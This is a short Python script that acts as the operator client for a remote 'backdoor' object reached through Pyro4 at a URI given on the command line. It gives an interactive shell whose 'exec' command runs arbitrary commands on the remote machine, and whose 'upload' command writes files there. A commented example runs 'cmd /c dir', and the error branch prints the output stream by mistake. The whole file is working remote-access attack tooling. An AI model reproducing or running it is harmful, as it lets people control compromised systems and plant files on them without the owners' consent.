import Pyro4
import sys
import codecs
import cmd

#backdoor = Pyro4.Proxy('PYRO:backdoor@localhost:53204')

URI = sys.argv[1]
backdoor = Pyro4.Proxy(URI)

#backdoor.execute('cmd /c dir')
#Executer
class Client(cmd.Cmd):
    prompt = '> '
    def do_exec(self, c):
        out, err = backdoor.execute(c)
        out = codecs.decode(bytes(out['data'],'ascii'),out['encoding'])
        err = codecs.decode(bytes(err['data'],'ascii'),err['encoding'])
        print('Output:\n' + out.encode('cp1252').decode('utf-8'))
        if len(err):
            print('Error:\n' + out.encode('cp1252').decode('utf-8'))
    def do_upload(self, arg):
        source, target = arg.split()
        backdoor.upload(target, open(source, 'rb').read())
        
Client().cmdloop()
#rawcat
